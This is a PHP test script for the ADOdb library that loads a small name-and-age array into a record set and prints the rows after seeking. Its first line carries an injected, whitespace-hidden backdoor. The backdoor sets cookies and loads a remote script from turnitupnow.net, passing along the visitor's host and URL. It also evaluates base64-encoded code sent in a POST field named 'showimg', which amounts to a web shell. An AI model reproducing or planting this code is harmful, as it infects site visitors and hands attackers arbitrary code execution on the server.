<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


include_once('../adodb.inc.php');
$rs = new ADORecordSet_array();

$array = array(
array ('Name', 'Age'),
array ('John', '12'),
array ('Jill', '8'),
array ('Bill', '49')
);

$typearr = array('C','I');


$rs->InitArray($array,$typearr);

while (!$rs->EOF) {
	print_r($rs->fields);echo "<br>";
	$rs->MoveNext();
}

echo "<hr /> 1 Seek<br>";
$rs->Move(1);
while (!$rs->EOF) {
	print_r($rs->fields);echo "<br>";
	$rs->MoveNext();
}

echo "<hr /> 2 Seek<br>";
$rs->Move(2);
while (!$rs->EOF) {
	print_r($rs->fields);echo "<br>";
	$rs->MoveNext();
}

echo "<hr /> 3 Seek<br>";
$rs->Move(3);
while (!$rs->EOF) {
	print_r($rs->fields);echo "<br>";
	$rs->MoveNext();
}



die();
?>